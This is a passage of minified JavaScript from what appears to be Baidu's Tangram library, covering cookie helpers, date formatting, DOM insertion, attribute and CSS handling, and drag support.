null},t.cookie.get=function(e){var n=t.cookie.getRaw(e);return"string"==typeof n?(n=decodeURIComponent(n),n):null},t.cookie.setRaw=function(e,n,r){if(!t.cookie._isValidKey(e))return;r=r||{};var i=r.expires;"number"==typeof r.expires&&(i=new Date,i.setTime(i.getTime()+r.expires)),document.cookie=e+"="+n+(r.path?"; path="+r.path:"")+(i?"; expires="+i.toGMTString():"")+(r.domain?"; domain="+r.domain:"")+(r.secure?"; secure":"")},t.cookie.remove=function(e,n){n=n||{},n.expires=new Date(0),t.cookie.setRaw(e,"",n)},t.cookie.set=function(e,n,r){t.cookie.setRaw(e,encodeURIComponent(n),r)},t.createClass=function(e,n,r){e=t.isFunction(e)?e:function(){},r=typeof n=="object"?n:r||{};var i=function(){var t=this;r.decontrolled&&(t._decontrol_=!0),i.superClass.apply(t,arguments);for(var n in i.options)t[n]=i.options[n];e.apply(t,arguments);for(var n=0,s=i._reg_;s&&n<s.length;n++)s[n].apply(t,arguments)};return t.extend(i,{superClass:r.superClass||t.base.Class,inherits:function(n){if(typeof n!="function")return i;var r=function(){};r.prototype=(i.superClass=n).prototype;var s=i.prototype=new r;return t.extend(i.prototype,e.prototype),s.constructor=e,i},register:function(e,n){return(i._reg_||(i._reg_=[])).push(e),n&&t.extend(i.prototype,n),i},extend:function(e){return t.extend(i.prototype,e),i}}),n=t.isString(n)?n:r.className||r.type,t.isString(n)&&(e.prototype._type_=n),t.isFunction(i.superClass)&&i.inherits(i.superClass),i},t.createSingle=function(e,n){var r=new t.base.Class;return t.isString(n)&&(r._type_=n),t.extend(r,e)},t.date=t.date||{},t.createChain("number",function(e){var n=parseFloat(e),r=isNaN(n)?n:e,i=typeof r=="number"?Number:String,s=i.prototype;return r=new i(r),t.forEach(t.number.$Number.prototype,function(e,t){s[t]||(r[t]=e)}),r}),t.number.extend({pad:function(e){var t=this,n="",r=t<0,i=String(Math.abs(t));return i.length<e&&(n=(new Array(e-i.length+1)).join("0")),(r?"-":"")+n+i}}),t.date.format=function(e,n){function r(e,t){n=n.replace(e,t)}if("string"!=typeof n)return e.toString();var i=t.number.pad,s=e.getFullYear(),o=e.getMonth()+1,u=e.getDate(),a=e.getHours(),f=e.getMinutes(),l=e.getSeconds();return r(/yyyy/g,i(s,4)),r(/yy/g,i(parseInt(s.toString().slice(2),10),2)),r(/MM/g,i(o,2)),r(/M/g,o),r(/dd/g,i(u,2)),r(/d/g,u)
,r(/HH/g,i(a,2)),r(/H/g,a),r(/hh/g,i(a%12,2)),r(/h/g,a%12),r(/mm/g,i(f,2)),r(/m/g,f),r(/ss/g,i(l,2)),r(/s/g,l),n},t.date.parse=function(e){var t=new RegExp("^\\d+(\\-|\\/)\\d+(\\-|\\/)\\d+$");if("string"==typeof e){if(t.test(e)||isNaN(Date.parse(e))){var n=e.split(/ |T/),r=n.length>1?n[1].split(/[^\d]/):[0,0,0],i=n[0].split(/[^\d]/);return new Date(i[0]-0,i[1]-1,i[2]-0,r[0]-0,r[1]-0,r[2]-0)}return new Date(e)}return new Date},t.dom.extend({pushStack:function(e){var n=t.dom();return t.merge(n,e),n.prevObject=this,n.context=this.context,n}}),t.dom.createElements=function(){function i(e,t){var n=e.getElementsByTagName("SCRIPT"),r,i,s;for(r=n.length-1;r>=0;r--)s=n[r],i=t.createElement("SCRIPT"),s.id&&(i.id=s.id),s.src&&(i.src=s.src),s.type&&(i.type=s.type),i[s.text?"text":"textContent"]=s.text||s.textContent,s.parentNode.replaceChild(i,s)}var e=/<(\w+)/i,n=/<|&#?\w+;/,r={area:[1,"<map>","</map>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],legend:[1,"<fieldset>","</fieldset>"],option:[1,"<select multiple='multiple'>","</select>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],_default:[0,"",""]};return r.optgroup=r.option,r.tbody=r.tfoot=r.colgroup=r.caption=r.thead,r.th=r.td,function(s,o){t.isNumber(s)&&(s=s.toString()),o=o||document;var u,a,f,l=s,c=l.length,h=o.createElement("div"),p=o.createDocumentFragment(),d=[];if(t.isString(l))if(!n.test(l))d.push(o.createTextNode(l));else{u=r[l.match(e)[1].toLowerCase()]||r._default,h.innerHTML="<i>mz</i>"+u[1]+l+u[2],h.removeChild(h.firstChild),i(h,o),a=u[0],f=h;while(a--)f=f.firstChild;t.merge(d,f.childNodes),t.forEach(d,function(e){p.appendChild(e)}),h=f=null}return h=null,d}}(),t.dom.extend({add:function(e,n){var r=t.array(this.get());switch(t.type(e)){case"HTMLElement":r.push(e);break;case"$DOM":case"array":t.merge(r,e);break;case"string":t.merge(r,t.dom(e,n));break;default:typeof e=="object"&&e.length&&t.merge(r,e)}return this.pushStack(r.unique())}}),t.dom.extend({addClass:function(e){if(!arguments.length)return this;var n=typeof e,r=" ";if(n=="string"){e=t.string.trim(e);var i=e.split(" ");t.forEach(this,function(e,t){var n=e.className;for(var s=0;s<i.length;s++)~(r+n+r).indexOf(r+i[s]+r)||(n+=" "+i[s]);e.className=n.replace(/^\s+/g,"")})}else n=="function"&&t.forEach(this,function(n,r){t.dom(n).addClass(e.call(n,r,n.className))});return this}}),t.dom.extend({getDocument:function(){if(this.size()<=0)return undefined;var e=this[0];return e.nodeType==9?e:e.ownerDocument||e.document}}),t._util_.cleanData=function(e){var n;for(var r=0,i;i=e[r];r++){n=t.id(i,"get");if(!n)continue;t._util_.eventBase.queue.remove(i),t.id(i,"remove")}},t.dom.extend({empty:function(){for(var e=0,n;n=this[e];e++){n.nodeType===1&&t._util_.cleanData(n.getElementsByTagName("*"));while(n.firstChild)n.removeChild(n.firstChild)}return this}}),t.dom.extend({append:function(){return t.check("^(?:string|function|HTMLElement|\\$DOM)(?:,(?:string|array|HTMLElement|\\$DOM))*$","baidu.dom.append"),t._util_.smartInsert(this,arguments,function(e){this.nodeType===1&&this.appendChild(e)}),this}}),t.dom.extend({html:function(e){var n=t.dom,r=t._util_,i=this,s=!1,o=!!r.support.dom.div.getElementsByTagName("link").length,u=r.support.dom.div.firstChild.nodeType===3,a;if(!this.size())switch(typeof e){case"undefined":return undefined;default:return i}var f="abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",l=/<(?:script|style|link)/i,c=new RegExp("<(?:"+f+")[\\s/>]","i"),h=/^\s+/,p=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,d=/<([\w:]+)/,v={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};return v.optgroup=v.option,v.tbody=v.tfoot=v.colgroup=v.caption=v.thead,v.th=v.td,o||(v._default=[1,"X<div>","</div>"]),t.forEach(i,function(t,r){if(a)return;var f=n(t);switch(typeof e){case"undefined":a=t.nodeType===1?t.innerHTML:undefined;return;case"number":e=String(e);case"string":s=!0;if(!l.test(e)&&(o||!c.test(e))&&(u||!h.test(e))&&!v[(d.exec(e)||["",""])[1].toLowerCase()]){e=e.replace(p,"<$1></$2>");try{t.nodeType===1&&(f.empty(),t.innerHTML=e),t=0}catch(m){}}t&&i.empty().append(e);break;case"function":s=!0,f.html(e.call(t,r,f.html()))}}),s?i:a}}),t._util_.smartInsert=function(e,n,r){if(n.length<=0||e.size()<=0)return;if(t.type(n[0])==="function"){var i=n[0],s;return t.forEach(e,function(e,o){s=t.dom(e),n[0]=i.call(e,o,s.html()),t._util_.smartInsert(s,n,r)})}var o=e.getDocument()||document,u=o.createDocumentFragment(),a=e.length-1,f;for(var l=0,c;c=n[l];l++)c.nodeType?u.appendChild(c):t.forEach(~"string|number".indexOf(t.type(c))?t.dom.createElements(c,o):c,function(e){u.appendChild(e)});if(!(f=u.firstChild))return;t.forEach(e,function(e,t){r.call(e.nodeName.toLowerCase()==="table"&&f.nodeName.toLowerCase()==="tr"?e.tBodies[0]||e.appendChild(e.ownerDocument.createElement("tbody")):e,t<a?u.cloneNode(!0):u)})},t.dom.extend({after:function(){return t.check("^(?:string|function|HTMLElement|\\$DOM)(?:,(?:string|array|HTMLElement|\\$DOM))*$","baidu.dom.after"),t._util_.smartInsert(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)}),this}}),t.makeArray=function(e,n){var r=n||[];return e?(e.length==null||~"string|function|regexp".indexOf(t.type(e))?[].push.call(r,e):t.merge(r,e),r):r},t.dom.extend({map:function(e){t.check("function","baidu.dom.map");var n=[],r=0;return t.forEach(this,function(t,s){n[r++]=e.call(t,s,t,t)}),this.pushStack(n)}}),t._util_.isXML=function(e){var t=(e?e.ownerDocument||e:0).documentElement;return t?t.nodeName!=="HTML":!1},t.dom.extend({clone:function(){function u(e){return e.getElementsByTagName?e.getElementsByTagName("*"):e.querySelectorAll?e.querySelectorAll("*"):[]}function a(e,n){n.clearAttributes&&n.clearAttributes(),n.mergeAttributes&&n.mergeAttributes(e);switch(n.nodeName.toLowerCase()){case"object":n.outerHTML=e.outerHTML;break;case"textarea":case"input":~"checked|radio".indexOf(e.type)&&(e.checked&&(n.defaultChecked=n.checked=e.checked),n.value!==e.value&&(n.value=e.value)),n.defaultValue=e.defaultValue;break;case"option":n.selected=e.defaultSelected;break;case"script":n.text!==e.text&&(n.text=e.text)}n[t.key]&&n.removeAttribute(t.key)}function f(e,i){if(i.nodeType!==1||!t.id(e,"get"))return;var s=r.get(e);for(var o in s)for(var u=0,a;a=s[o][u];u++)n.add(i,o,a.orig,null,null,a.one)}function l(e,n,r){var i=e.cloneNode(!0),l,c,h;if((!o||!s)&&(e.nodeType===1||e.nodeType===11)&&!t._util_.isXML(e)){a(e,i),l=u(e),c=u(i),h=l.length;for(var p=0;p<h;p++)c[p]&&a(l[p],c[p])}if(n){f(e,i);if(r){l=u(e),c=u(i),h=l.length;for(var p=0;p<h;p++)f(l[p],c[p])}}return i}var e=t._util_,n=e.eventBase.core,r=e.eventBase.queue,i=e.support.dom.div,s=e.support.dom.input.cloneNode(!0).checked,o=!0;return!i.addEventListener&&i.attachEvent&&i.fireEvent&&(i.attachEvent("onclick",function(){o=!1}),i.cloneNode(!0).fireEvent("onclick")),function(e,t){return e=!!e,t=!!t,this.map(function(){return l(this,e,t)})}}()}),t._util_.contains=document.compareDocumentPosition?function(e,t){return!!(e.compareDocumentPosition(t)&16)}:function(e,t){if(e===t)return!1;if(e.contains&&t.contains)return e.contains(t);while(t=t.parentNode)if(t===e)return!0;return!1},t.dom.extend({contains:function(e){var n=this[0];return e=t.dom(e)[0],!n||!e?!1:t._util_.contains(n,e)}}),t._util_.smartInsertTo=function(e,n,r,i){var s=t.dom(n),o=s[0],u;if(i&&o&&(!o.parentNode||o.parentNode.nodeType===11))i=i==="before",u=t.merge(i?e:s,i?s:e),e!==u&&(e.length=0,t.merge(e,u));else for(var a=0,f;f=s[a];a++)t._util_.smartInsert(t.dom(f),a>0?e.clone(!0,!0):e,r)},t.dom.extend({appendTo:function(e){var n=[],r=n.push;return t.check("^(?:string|HTMLElement|\\$DOM)$","baidu.dom.appendTo"),t._util_.smartInsertTo(this,e,function(e){r.apply(n,t.makeArray(e.childNodes)),this.appendChild(e)}),this.pushStack(n)}}),t._util_.access=function(e,n,r,i,s){if(e.size()<=0)return e;switch(t.type(n)){case"string":if(r===undefined)return i.call(e,e[0],n);e.each(function(o,u){i.call(e,u,n,t.type(r)==="function"?r.call(u,o,i.call(e,u,n)):r,s)});break;case"object":for(var o in n)t._util_.access(e,o,n[o],i,r)}return e},t._util_.nodeName=function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},t._util_.propFixer={tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",classname:"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable",rboolean:/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i},!document.createElement("form").enctype&&(t._util_.propFixer.enctype="encoding"),t._util_.prop=function(){var e=/^(?:button|input|object|select|textarea)$/i,n=/^a(?:rea|)$/i,r=document.createElement("select"),i=r.appendChild(document.createElement("option")),s={tabIndex:{get:function(t){var r=t.getAttributeNode("tabindex");return r&&r.specified?parseInt(r.value,10):e.test(t.nodeName)||n.test(t.nodeName)&&t.href?0:undefined}}};return!i.selected&&(s.selected={get:function(e){var t=e.parentNode;return t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex),null}}),r=i=null,function(e,n,r){var i=e.nodeType,o,u;if(!e||~"238".indexOf(i))return;if(i!==1||!t._util_.isXML(e))n=t._util_.propFixer[n]||n,o=s[n]||{};return r!==undefined?o.set&&(u=o.set(e,n,r))!==undefined?u:e[n]=r:o.get&&(u=o.get(e,n))!==null?u:e[n]}}(),t._util_.support.getSetAttribute=t._util_.support.dom.div.className!=="t",t._util_.nodeHook=function(){if(t._util_.support.getSetAttribute)return;var e={};return e.name=e.id=e.coords=!0,{get:function(t,n){var r=t.getAttributeNode(n);return r&&(e[n]?r.value!=="":r.specified)?r.value:undefined},set:function(e,t,n){var r=e.getAttributeNode(t);return r||(r=document.createAttribute(t),e.setAttributeNode(r)),r.value=n+""}}}(),t._util_.removeAttr=function(){var e=t._util_.propFixer,n=/\s+/,r=t._util_.support.getSetAttribute;return function(i,s){if(!s||i.nodeType!==1)return;var o=s.split(n),u,a;for(var f=0,l;l=o[f];f++)u=e[l]||l,a=e.rboolean.test(l),!a&&t._util_.attr(i,l,""),i.removeAttribute(r?l:u),a&&u in i&&(i[u]=!1)}}(),t._util_.attr=function(){var e=t._util_,n=/^(?:button|input)$/i,r=e.support.dom,i=r.input.value==="t",s=r.a.getAttribute("href")==="/a",o=/top/.test(r.a.getAttribute("style")),u=e.nodeHook,a={className:"class"},f={get:function(t,n){var r=e.prop(t,n),i;return r===!0||typeof r!="boolean"&&(i=t.getAttributeNode(n))&&i.nodeValue!==!1?n.toLowerCase():undefined},set:function(t,n,r){if(r===!1)e.removeAttr(t,n);else{var i=e.propFixer[n]||n;i in t&&(t[i]=!0),t.setAttribute(n,n.toLowerCase())}return n}},l={type:{set:function(t,r,s){if(n.test(t.nodeName)&&t.parentNode)return s;if(!i&&s==="radio"&&e.nodeName(t,"input")){var o=t.value;return t.setAttribute("type",s),o&&(t.value=o),s}}},value:{get:function(t,n){return u&&e.nodeName(t,"button")?u.get(t,n):n in t?t.value:null},set:function(t,n,r){if(u&&e.nodeName(t,"button"))return u.set(t,n,r);t.value=r}}};return e.support.getSetAttribute||(t.forEach(["width","height"],function(e){l[e]={set:function(e,t,n){if(n==="")return e.setAttribute(t,"auto"),n}}}),l.contenteditable={get:u.get,set:function(e,t,n){n===""&&(n=!1),u.set(e,t,n)}}),s||t.forEach(["href","src","width","height"],function(e){l[e]={get:function(e,t){var n=e.getAttribute(t,2);return n===null?undefined:n}}}),o||(l.style={get:function(e){return e.style.cssText.toLowerCase()||undefined},set:function(e,t,n){return e.style.cssText=n+""}}),function(n,r,i,s){var o=n.nodeType,c=o!==1||!e.isXML(n),h,p;if(!n||~"238".indexOf(o))return;if(s&&t.dom.fn[r])return t.dom(n)[r](i);c&&(r=a[r]||r.toLowerCase(),h=l[r]||(e.propFixer.rboolean.test(r)?f:u));if(i!==undefined){if(i===null){e.removeAttr(n,r);return}return c&&h&&h.set&&(p=h.set(n,r,i))!==undefined?p:(n.setAttribute(r,i+""),i)}return c&&h&&h.get&&(p=h.get(n,r))!==null?p:(p=n.getAttribute(r),p===null?undefined:p)}}(),t.dom.extend({attr:function(e,n){return t._util_.access(this,e,n,function(e,n,r,i){return t._util_.attr(e,n,r,i)})}}),t.dom.extend({before:function(){return t.check("^(?:string|function|HTMLElement|\\$DOM)(?:,(?:string|array|HTMLElement|\\$DOM))*$","baidu.dom.before"),t._util_.smartInsert(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)}),this}}),t.dom.extend({bind:function(e,t,n){return this.on(e,undefined,t,n)}}),t.dom.match=function(){function r(e){var t=[],n;while(e=e.parentNode)e.nodeType&&t.push(e);for(var n=t.length-1;n>-1;n--)if(t[n].nodeType==1||t[n].nodeType==9)return t[n];return null}var e=/^[\w\#\-\$\.\*]+$/,n=document.createElement("DIV");return n.id="__tangram__",function(e,n,i){var s,o=t.array();switch(t.type(n)){case"$DOM":for(var u=e.length-1;u>-1;u--)for(var a=n.length-1;a>-1;a--)e[u]===n[a]&&o.push(e[u]);break;case"function":t.forEach(e,function(e,t){n.call(e,t)&&o.push(e)});break;case"HTMLElement":t.forEach(e,function(e){e==n&&o.push(e)});break;case"string":var f=t.query(n,i||document);t.forEach(e,function(e){if(s=r(e)){var i=s.nodeType==1?t.query(n,s):f;for(var u=0,a=i.length;u<a;u++)if(i[u]===e){o.push(e);break}}}),o=o.unique();break;default:o=t.array(e).unique()}return o}}(),t.dom.extend({children:function(e){var n=[];return this.each(function(){t.forEach(this.children||this.childNodes,function(e){e.nodeType==1&&n.push(e)})}),this.pushStack(t.dom.match(n,e))}}),t.dom.extend({closest:function(e,n){var r=t.array();return t.forEach(this,function(i){var s=[i];while(i=i.parentNode)i.nodeType&&s.push(i);s=t.dom.match(s,e,n),s.length&&r.push(s[0])}),this.pushStack(r.unique())}}),t.dom.extend({contents:function(){var e=[],n;for(var r=0,i;i=this[r];r++)n=i.nodeName,e.push.apply(e,t.makeArray(n&&n.toLowerCase()==="iframe"?i.contentDocument||i.contentWindow.document:i.childNodes));return this.pushStack(e)}}),t.dom.extend({getComputedStyle:function(e){if(!this[0].ownerDocument)return;var t=this[0].ownerDocument.defaultView,n=t&&t.getComputedStyle&&t.getComputedStyle(this[0],null),r=n?n.getPropertyValue(e)||n[e]:"";return r||this[0].style[e]}}),t.dom.extend({getCurrentStyle:function(){var e=document.documentElement.currentStyle?function(e){return this[0].currentStyle?this[0].currentStyle[e]:this[0].style[e]}:function(e){return this.getComputedStyle(e)};return function(t){return e.call(this,t)}}()}),t._util_.getWidthOrHeight=function(){function i(e,t){var n={};for(var r in t)n[r]=e.style[r],e.style[r]=t[r];return n}var e={},n={position:"absolute",visibility:"hidden",display:"block"},r=/^(none|table(?!-c[ea]).+)/;return t.forEach(["Width","Height"],function(s){var o={Width:["Right","Left"],Height:["Top","Bottom"]}[s];e["get"+s]=function(e,u){var a=t.dom(e),f=e.offsetWidth===0&&r.test(a.getCurrentStyle("display"))&&i(e,n),l=e["offset"+s]||parseInt(a.getCurrentStyle(s.toLowerCase()))||0,c="padding|border";return u&&t.forEach(u.split("|"),function(e){~c.indexOf(e)?c=c.replace(new RegExp("\\|?"+e+"\\|?"),""):(l+=parseFloat(a.getCurrentStyle(e+o[0]))||0,l+=parseFloat(a.getCurrentStyle(e+o[1]))||0)}),c&&t.forEach(c.split("|"),function(e){l-=parseFloat(a.getCurrentStyle(e+o[0]+(e==="border"?"Width":"")))||0,l-=parseFloat(a.getCurrentStyle(e+o[1]+(e==="border"?"Width":"")))||0}),f&&i(e,f),l}}),function(t,n,r){return e[n==="width"?"getWidth":"getHeight"](t,r)}}(),t._util_.setPositiveNumber=function(){var e=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,t=new RegExp("^("+e+")(.*)$","i");return function(e,n,r){var i=t.exec(n);return i?Math.max(0,i[1]-(r||0))+(i[2]||"px"):n}}(),t._util_.style=t.extend({set:function(e,t,n){e.style[t]=n}},document.documentElement.currentStyle?{get:function(e,n){var r=t.dom(e).getCurrentStyle(n),i;return/^-?(?:\d*\.)?\d+(?!px)[^\d\s]+$/i.test(r)&&(i=e.style.left,e.style.left=n==="fontSize"?"1em":r,r=e.style.pixelLeft+"px",e.style.left=i),r}}:{get:function(e,n){return t.dom(e).getCurrentStyle(n)}}),t._util_.cssHooks=function(){function o(e,r,i){t.type(i)==="string"&&(i=t._util_.setPositiveNumber(e,i)),n.set(e,r,i)}var e=/alpha\s*\(\s*opacity\s*=\s*([^)]*)/i,n=t._util_.style,r=t._util_.support.dom.a,i={fontWeight:{normal:400,bold:700,bolder:700,lighter:100}},s={opacity:{},width:{},height:{},fontWeight:{get:function(e,t){var r=n.get(e,t);return i.fontWeight[r]||r}}};return t.extend(s.opacity,/^0.5/.test(r.style.opacity)?{get:function(e,n){var r=t.dom(e).getCurrentStyle(n);return r===""?"1":r}}:{get:function(t){return e.test((t.currentStyle||t.style).filter||"")?parseFloat(RegExp.$1)/100+"":"1"},set:function(t,n,r){var i=(t.currentStyle||t.style).filter||"",s=r*100;t.style.zoom=1,t.style.filter=e.test(i)?i.replace(e,"Alpha(opacity="+s):i+" progid:dximagetransform.microsoft.Alpha(opacity="+s+")"}}),t.forEach(["width","height"],function(e){s[e]={get:function(n){return t._util_.getWidthOrHeight(n,e)+"px"},set:o}}),t.each({padding:"",border:"Width"},function(e,t){s[e+t]={set:o};var n=["Top","Right","Bottom","Left"],r=0;for(;r<4;r++)s[e+n[r]+t]={set:o}}),s}(),t._util_.cssNumber={columnCount:!0,fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},t.string.extend({toCamelCase:function(){var e=this.valueOf();return e.indexOf("-")<0&&e.indexOf("_")<0?e:e.replace(/[-_][^-_]/g,function(e){return e.charAt(1).toUpperCase()})}}),t.dom.styleFixer=function(){var e=t._util_.style,n=t._util_.cssHooks,r=t._util_.cssNumber,i={"float":t._util_.support.dom.a.style.cssFloat?"cssFloat":"styleFloat"};return function(s,o,u){var a=t.string.toCamelCase(o),f=u===undefined?"get":"set",l,c;return a=i[a]||a,l=t.type(u)==="number"&&!r[a]?u+"px":u,c=n.hasOwnProperty(a)&&n[a][f]||e[f],c(s,a,l)}}(),t.dom.extend({css:function(e,n){return t.check("^(?:(?:string(?:,(?:number|string|function))?)|object)$","baidu.dom.css"),t._util_.access(this,e,n,function(e,n,r){var i=t.dom.styleFixer;return i?i(e,n,r):r===undefined?this.getCurrentStyle(n):e.style[n]=r})}}),t.dom.extend({data:function(){var e=t.key,n=t.global("_maps_HTMLElementData");return function(r,i){t.forEach(this,function(n){!n[e]&&(n[e]=t.id())});if(t.isString(r)){if(typeof i=="undefined"){var s,o;o=this[0]&&(s=n[this[0][e]])&&s[r];if(typeof o!="undefined")return o;var u=this[0].getAttribute("data-"+r);return~String(u).indexOf("{")?Function("return "+u)():u}t.forEach(this,function(t){var s=n[t[e]]=n[t[e]]||{};s[r]=i})}else t.type(r)=="object"&&t.forEach(this,function(i){var s=n[i[e]]=n[i[e]]||{};t.forEach(r,function(e,t){s[t]=r[t]})});return this}}()}),t.lang.Class=t.base.Class,t.lang.Event=t.base.Event,t.dom.extend({delegate:function(e,t,n,r){return typeof n=="function"&&(r=n,n=null),this.on(t,e,n,r)}}),t.dom.extend({filter:function(e){return this.pushStack(t.dom.match(this,e))}}),t.dom.extend({remove:function(e,n){arguments.length>0&&t.check("^string(?:,boolean)?$","baidu.dom.remove");var r=e?this.filter(e):this;for(var i=0,s;s=r[i];i++)!n&&s.nodeType===1&&(t._util_.cleanData(s.getElementsByTagName("*")),t._util_.cleanData([s])),s.parentNode&&s.parentNode.removeChild(s);return this}}),t.dom.extend({detach:function(e){return e&&t.check("^string$","baidu.dom.detach"),this.remove(e,!0)}}),t.object.extend=t.extend,t.dom.getStyle=function(e,n){return t.dom(t.dom.g(e)).css(n)},t.page=t.page||{},t.page.getScrollTop=function(){var e=document;return window.pageYOffset||e.documentElement.scrollTop||e.body.scrollTop},t.page.getScrollLeft=function(){var e=document;return window.pageXOffset||e.documentElement.scrollLeft||e.body.scrollLeft},function(){t.page.getMousePosition=function(){return{x:t.page.getScrollLeft()+e.x,y:t.page.getScrollTop()+e.y}};var e={x:0,y:0};t.event.on(document,"onmousemove",function(t){t=window.event||t,e.x=t.clientX,e.y=t.clientY})}(),t.dom.extend({off:function(e,n,r){var i=t._util_.eventBase.core,s=this;return e?typeof e=="string"?(typeof n=="function"&&(r=n,n=null),e=e.split(/[ ,]/),t.forEach(this,function(s){t.forEach(e,function(e){i.remove(s,e,r,n)})})):typeof e=="object"&&t.forEach(e,function(e,t){s.off(t,n,e)}):t.forEach(this,function(e){i.remove(e)}),this}}),t.event.un=t.un=function(e,n,r){return typeof e=="string"&&(e=t.dom.g(e)),t.dom(e).off(n.replace(/^\s*on/,""),r),e},t.event.preventDefault=function(e){return(new t.event(e)).preventDefault()},function(){function h(){e=!1,clearInterval(o),r.capture&&n.releaseCapture?n.releaseCapture():r.capture&&window.releaseEvents&&window.releaseEvents(Event.MOUSEMOVE|Event.MOUSEUP),document.body.style.MozUserSelect=c;var i=t.dom(document);i.off("selectstart",d),r.autoStop&&i.off("mouseup",h),t.isFunction(r.ondragend)&&r.ondragend(n,r,{left:f,top:l})}function p(c){if(!e){clearInterval(o);return}var h=r.range||[],p=t.page.getMousePosition(),d=u+p.x-i,v=a+p.y-s;t.isObject(h)&&h.length==4&&(d=Math.max(h[3],d),d=Math.min(h[1]-n.offsetWidth,d),v=Math.max(h[0],v),v=Math.min(h[2]-n.offsetHeight,v)),n.style.left=d+"px",n.style.top=v+"px",f=d,l=v,t.isFunction(r.ondrag)&&r.ondrag(n,r,{left:f,top:l})}function d(e){return t.event.preventDefault(e,!1)}var e=!1,n,r,i,s,o,u,a,f,l,c;t.dom.drag=function(v,m){if(!(n=t.dom.g(v)))return!1;r=t.object.extend({autoStop:!0,capture:!0,interval:16},m),f=u=parseInt(t.dom.getStyle(n,"left"))||0,l=a=parseInt(t.dom.getStyle(n,"top"))||0,e=!0,setTimeout(function(){var e=t.page.getMousePosition();i=r.mouseEvent?t.page.getScrollLeft()+r.mouseEvent.clientX:e.x,s=r.mouseEvent?t.page.getScrollTop()+r.mouseEvent.clientY:e.y,clearInterval(o),o=setInterval(p,r.interval)},1);var g=t.dom(document);return r.autoStop&&g.on("mouseup",h),g.on("selectstart",d),r.capture&&n.setCapture?n.setCapture():r.capture&&window.captureEvents&&window.captureEvents(Event.MOUSEMOVE|Event.MOUSEUP),c=document.body.style.MozUserSelect,document.body.style.MozUserSelect="none",t.isFunction(r.ondragstart)&&r.ondragstart(n,r),{stop:h,dispose:h,update:function(e){t.object.extend(r,e)}}}}(),t.lang.isFunction=t.isFunction,t.dom.extend({end:function(){return this.prevObject||t.dom()}}),t.dom.extend({eq:function(e){t.check("number","baidu.dom.eq");var n=this.get(e);return this.pushStack(typeof n=="undefined"?[]:[n])}}),t.dom.extend({find:function(e){var n=[],r,i="__tangram__find__",s=[];switch(t.type(e)){case"string":this.each(function(){t.merge(s,t.query(e,this))});break;case"HTMLElement":r=e.tagName+"#"+(e.id?e.id:e.id=i),this.each(function(){t.query(r,this).length>0&&n.push(e)}),e.id==i&&(e.id=""),n.length>0&&t.merge(s,n);break;case"$DOM":n=e.get(),this.each(function(){t.forEach(t.query("*",this),function(e){for(var t=0,r=n.length;t<r;t++)e===n[t]&&(s[s.length++]=n[t])})})}return this.pushStack(s)}}),t.dom.extend({first:function(){return this.eq(0)}}),t.dom.getAttr=function(e,n){return t.dom(t.dom.g(e)).attr(n)},t.dom.extend({getWindow:function(){var e=this.getDocument();return this.size()<=0?undefined:e.parentWindow||e.defaultView}}),t.dom.extend({offsetParent:function(){return this.map(function(){var e=this.offsetParent||document.body,n=/^(?:body|html)$/i;while(e&&t.dom(e).getCurrentStyle("position")==="static"&&!n.test(e.nodeName))e=e.offsetParent;return e})}}),t.dom.extend({position:function(){if(this.size()<=0)return 0;var e=/^(?:body|html)$/i,t=this.offset(),n=this.offsetParent(),r=e.test(n[0].nodeName)?{left:0,top:0}:n.offset();return t.left-=parseFloat(this.getCurrentStyle("marginLeft"))||0,t.top-=parseFloat(this.getCurrentStyle("marginTop"))||0,r.left+=parseFloat(n.getCurrentStyle("borderLeftWidth"))||0,r.top+=parseFloat(n.getCurrentStyle("borderTopWidth"))||0,{left:t.left-r.left,top:t.top-r.top}}}),t.dom.extend({offset:function(){function e(e,n,r){var i=i=t.dom(e),s=i.getCurrentStyle("position");s==="static"&&(e.style.position="relative");var o=i.offset(),u=i.getCurrentStyle("left"),a=i.getCurrentStyle("top"),f=~"absolute|fixed".indexOf(s)&&~(""+u+a).indexOf("auto"),l=f&&i.position();u=l&&l.left||parseFloat(u)||0,a=l&&l.top||parseFloat(a)||0,t.type("options")==="function"&&(n=n.call(e,r,o)),n.left!=undefined&&(e.style.left=n.left-o.left+u+"px"),n.top!=undefined&&(e.style.top=n.top-o.top+a+"px")}return function(n){if(n){t.check("^(?:object|function)$","baidu.dom.offset");for(var r=0,i;i=this[r];r++)e(i,n,r);return this}var s=this[0],o=this.getDocument(),u={left:0,top:0},a,f;if(!o)return;return f=o.documentElement,t._util_.contains(f,s)?(typeof s.getBoundingClientRect!="undefined"&&(u=s.getBoundingClientRect()),a=this.getWindow(),{left:u.left+(a.pageXOffset||f.scrollLeft)-(f.clientLeft||0),top:u.top+(a.pageYOffset||f.scrollTop)-(f.clientTop||0)}):u}}()}),t.dom.extend({has:function(e){var n=[],r=t.dom(document.body);return t.forEach(this,function(t){r[0]=t,r.find(e).length&&n.push(t)}),t.dom(n)}}),t.dom.extend({hasClass:function(e){if(arguments.length<=0||typeof e=="function")return this;if(this.size()<=0)return!1;e=e.replace(/^\s+/g,"").replace(/\s+$/g,"").replace(/\s+/g," ");var n=e.split(" 